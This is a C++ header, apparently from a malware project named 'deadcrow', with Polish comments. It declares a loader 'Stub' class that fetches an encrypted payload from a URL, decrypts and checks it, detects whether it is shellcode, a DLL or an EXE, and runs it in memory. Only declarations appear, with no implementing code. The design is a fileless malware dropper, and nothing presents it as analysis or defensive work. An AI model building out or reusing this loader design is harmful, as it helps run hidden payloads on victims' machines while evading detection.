#pragma once

#include <string>
#include <vector>
#include <functional>

namespace deadcrow {
namespace loader {

class Stub {
public:
    // Konstruktor
    Stub();
    
    // Pobieranie payloadu z URL
    bool fetchPayloadFromUrl(const std::string& url);
    
    // Ładowanie payloadu z pamięci
    bool loadPayloadFromMemory(const std::vector<uint8_t>& encrypted_payload, const std::string& key);
    
    // Wykonanie payloadu w pamięci
    bool executePayload();
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
private:
    // Zaszyfrowany payload
    std::vector<uint8_t> encrypted_payload_;
    
    // Odszyfrowany payload
    std::vector<uint8_t> payload_;
    
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Deszyfrowanie payloadu
    bool decryptPayload(const std::string& key);
    
    // Sprawdzanie integralności payloadu
    bool verifyPayloadIntegrity();
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Wykonanie shellcode'u w pamięci
    bool executeShellcode(const std::vector<uint8_t>& shellcode);
    
    // Wykonanie DLL w pamięci
    bool executeDll(const std::vector<uint8_t>& dll_data);
    
    // Wykrywanie typu payloadu
    enum class PayloadType {
        UNKNOWN,
        SHELLCODE,
        DLL,
        EXE
    };
    
    PayloadType detectPayloadType();
};

} // namespace loader
} // namespace deadcrow
